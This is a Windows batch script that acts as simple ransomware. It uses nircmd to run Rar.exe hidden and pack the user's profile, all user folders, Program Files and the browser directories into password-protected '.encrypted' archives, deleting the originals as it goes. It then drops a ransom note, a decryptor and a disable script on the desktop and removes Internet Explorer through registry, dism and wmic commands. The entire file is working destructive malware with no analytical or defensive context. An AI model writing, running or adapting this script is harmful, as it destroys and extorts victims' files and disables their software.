@echo off

cd C:\Users\%USERNAME%\Documents\

nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\Users\%USERNAME%\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\Users.encrypted C:\Users\*

nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\Users\%USERNAME%\*

nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\"Program Files"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\chrome.encrypted C:\"Program Files"\Google\Application\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\firefox.encrypted C:\"Program Files"\Mozilla Firefox"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\"Program Files"\"Common Files"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\iexplorer64.encrypted C:\"Program Files"\"Internet Explorer"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\"Program Files (x86)"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\chrome.encrypted C:\"Program Files (x86)"\Google\Application\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\%USERNAME%.encrypted C:\"Program Files (x86)"\"Common Files"\
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\iexplorer.encrypted C:\"Program Files (x86)"\"Internet Explorer"\*
nircmd.exe exec hide Rar.exe a -df -r -pc3VwZXJtYW5lbG9pcw== C:\Users\%USERNAME%\firefox.encrypted C:\"Program Files (x86)"\"Mozilla Firefox"\*


move /y "disable.bat" "C:\Users\%USERNAME%\Desktop\"
move /y "decryptor.bat" "C:\Users\%USERNAME%\Desktop\"
move /y "me_leia.txt" "C:\Users\%USERNAME%\Desktop\"
move /y "Rar.exe" "C:\Users\%USERNAME%\Desktop\"
nircmd.exe exec hide C:\Users\%USERNAME%\Desktop\disable.bat

reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}" /v IsInstalled /t REG_DWORD /d 0 /f

reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" /f

reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{89820200-ECBD-11cf-8B85-00AA005B4340}" /f
dism /online /disable-feature /featurename:Internet-Explorer-Optional /norestart
dism /online /disable-feature /featurename:Internet-Explorer-Optional-x86 /norestart
dism /online /disable-feature /featurename:Internet-Explorer-Optional-amd64 /norestart

wmic path win32_ie set enabled=false
wmic path win32_ie delete